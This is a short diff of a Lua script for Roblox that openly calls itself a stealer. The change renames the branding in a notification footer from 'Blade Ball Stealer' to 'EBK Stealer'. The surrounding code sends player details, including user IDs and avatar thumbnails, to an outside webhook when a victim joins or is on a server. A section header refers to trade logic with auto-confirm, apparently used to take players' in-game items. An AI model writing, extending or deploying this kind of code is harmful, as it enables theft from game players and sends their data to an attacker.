@@ -98,7 +98,7 @@ local function SendJoinMessage(list, prefix)
             ["thumbnail"] = {
                 ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
             },
-            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
+            ["footer"] = {["text"] = "EBK Stealer | Session Active"}
         }}
     }
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
@@ -125,7 +125,6 @@ local function SendOnServerMessage()
     }
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
-
 ---------------------------------------------------------
 -- LOGIQUE DE TRADE AVEC AUTO-CONFIRM
 ---------------------------------------------------------
